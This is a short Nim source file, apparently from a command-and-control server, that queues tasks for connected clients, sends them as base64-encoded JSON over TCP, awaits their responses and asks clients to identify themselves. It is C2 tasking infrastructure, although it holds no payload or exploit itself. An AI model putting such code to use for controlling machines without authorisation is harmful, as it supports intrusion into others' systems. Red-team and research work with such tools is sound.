import asyncdispatch, asyncnet, base64, json

import types

proc sendClientTask*(client: C2Client, taskName: string, jData: JsonNode = nil): Future[Task] {.async.} =
  var data: JsonNode
  if jData.isNil:
    data = %*{}
  else: 
    data = jData

  let createdTask = Task(
    client: client,
    id: len(client.server.tasks),
    action: taskName,
    status: TaskNotCompleted,
    arguments: data,
    future: new (ref Future[void])
  )

  client.server.tasks.add(createdTask)

  let pl = %*
    {
      "task": taskName,
      "taskId": createdTask.id,
      "data": data
    }

  if client.listenerType == "tcp":
    let tcpSocket: TCPSocket = client.getTcpSocket()
    await tcpSocket.socket.send(encode($pl) & "\r\n")
  
  return createdTask

proc awaitResponse*(task: Task) {.async.} =
  if task.future[].isNil():
    task.future[] = newFuture[void]()
  await task.future[]

proc askToIdentify*(client: C2Client) {.async.} =
  discard await client.sendClientTask("identify")
